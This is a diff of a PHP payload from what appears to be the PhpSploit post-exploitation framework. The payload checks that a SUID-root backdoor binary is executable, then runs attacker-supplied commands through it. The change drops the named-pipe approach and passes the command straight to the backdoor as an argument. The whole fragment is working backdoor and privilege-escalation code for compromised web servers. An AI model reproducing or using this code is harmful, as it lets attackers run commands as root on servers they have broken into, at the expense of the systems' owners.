@@ -11,17 +11,18 @@ if (substr(getPerms($PHPSPLOIT['BACKDOOR']), 9, 1) != 'x')
     return error("%s (SUIDROOT_BACKDOOR): Not executable",
         $PHPSPLOIT['BACKDOOR']);
 
-// write command to SUIDROOT_PIPE file
-if (($pipe_file = @fopen($PHPSPLOIT['PIPE'], 'w')) === False)
-    return error("%s (SUIDROOT_PIPE): Not writeable",
-        $PHPSPLOIT['PIPE']);
-fwrite($pipe_file, $PHPSPLOIT['COMMAND']);
-fclose($pipe_file);
+// // write command to SUIDROOT_PIPE file
+// if (($pipe_file = @fopen($PHPSPLOIT['PIPE'], 'w')) === False)
+//     return error("%s (SUIDROOT_PIPE): Not writeable",
+//         $PHPSPLOIT['PIPE']);
+// fwrite($pipe_file, $PHPSPLOIT['COMMAND']);
+// fclose($pipe_file);
 
 // execute SUIDROOT_BACKDOOR
-$result = execute($PHPSPLOIT['BACKDOOR']);
-$result = execute("exec 2>&1;" . $PHPSPLOIT['BACKDOOR']);
-file_put_contents($PHPSPLOIT['PIPE'], "");
+// return $PHPSPLOIT['BACKDOOR'] . " " . $PHPSPLOIT["COMMAND"];
+$result = execute($PHPSPLOIT['BACKDOOR'] . " " . $PHPSPLOIT["COMMAND"]);
+// $result = execute("exec 2>&1;" . $PHPSPLOIT['BACKDOOR']);
+// file_put_contents($PHPSPLOIT['PIPE'], "");
 return $result;
 
 ?>
